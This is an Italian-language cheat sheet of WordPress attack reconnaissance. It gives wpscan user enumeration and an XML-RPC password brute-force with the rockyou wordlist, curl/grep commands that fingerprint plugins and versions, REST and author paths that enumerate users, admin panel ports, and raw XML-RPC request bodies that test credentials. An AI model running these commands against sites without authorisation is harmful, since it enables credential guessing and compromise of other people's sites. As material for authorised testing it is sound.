```
### Wordpress - Tools

### Wpscan:
Tools per scanning automatizzato su CMS Wordpress, sia generico che speicifoc per singoli attacchi.

### Droopescan:
Alternativa a Wpscan

### Wpscan - UserEnumeration:
> wpscan --url https://<target> --random-user-agent -e u

### Wpscan - Exploit XmlRPC
> wpscan --password-attack xmlrpc -t 20 -U john -P /usr/share/wordlists/rockyou.txt --url https://<target>

# Common Attack - Pannelli amministrativi:
> cPanel 2082 - cPanel SSL 2083 -> cpanel.<nomeSito>.com o <nomeSito>:2082
> WHM 2086 - WHM SSL 2087 -> vhm.<nomeSito>.com o <nomeSito>:2086
> Webmail 2096 -> webmail.<nomeSito>.com o <nomeSito>:2096
> PhpMyAdmin -> <nomeSito>/PhPMyAdmin

# Common Attack - Plugin vulnerable
> curl -s https://<nomeSito>/?p=1 | grep plugins
> Search: /wp-content/plugins/<namePlugin>

# Common Attack - Version Wordpress vulnerable
> curl -s https://<nomeSito> | grep WordPress
Search: <meta name="generator" content="WordPress 6.3.1" />

# Common Attack - Search Themes
> curl -s https://<nomeSito> | grep themes

# Common Attack - -WpScan + Searchexploit su tutti i plugin che trova

## User Enumeration:
/wP-jsOn/wP/V2/UsErs/?search={admin}
/wP-jsOn/wP/V2/UsErs/1 
/wP-jsOn/wP/V2/UsErs 
?rest_route=/wp/v2/users
/AuthoR-SiteMap.xml 
/AuthoR/admin
/wp-json/oembed/1.0/embed?url=https://<nomeSito>/&format=json
/wp-json/oembed/1.0/embed?url=https:///<nomeSito>/<users>/&format=json 
/comments/feeds
/feed
public-api.wordpress.com/rest/v1.1/sites/blog.<nomeSito>.com/posts
api.*****.com/wp-json/wp/v2/users?search={admin}

## Altri Path utili:
/Wp-Admin
/Wp-lOgin.PhP
/WP-AdmIn/AdMIn-ajax.php
/Wp-ContEnt/UploAds/WpForms/
/Wp-SiTeMaP.XmL
/PhPMyAdmin



## Page Enumeration:
/?p={id}
/?attachment_id={id}


## Path Vulnerable:
/wp-login.php?action=lostpassword 
/wp-login.php?action=register


## XMLRPC - Wordpress
Verificare che sia disattivata la xxe rpc sui siti Wordpress. 
Se attivo è possibile "Publish a post", "Edit a post", "Delete a post", "Upload a new file", "Get a list of comments", "Edit comments", "PingBack".

# XML Body:
POST /xmlrpc%2ephp 
POST /xmlrpc.php HTTP/1.1 
Host: example.com
Content-Length: 135 

<?xml version="1.0" encoding="utf-8"?>   
<methodCall>    
	<methodName>system.listMethods</methodName>
	<params></params>
</methodCall>

<methodCall> 
	<methodName>wp.getUsersBlogs</methodName> 
	<params><param><value>admin</value></param>
	<param><value>password</value></param></params>
</methodCall>
```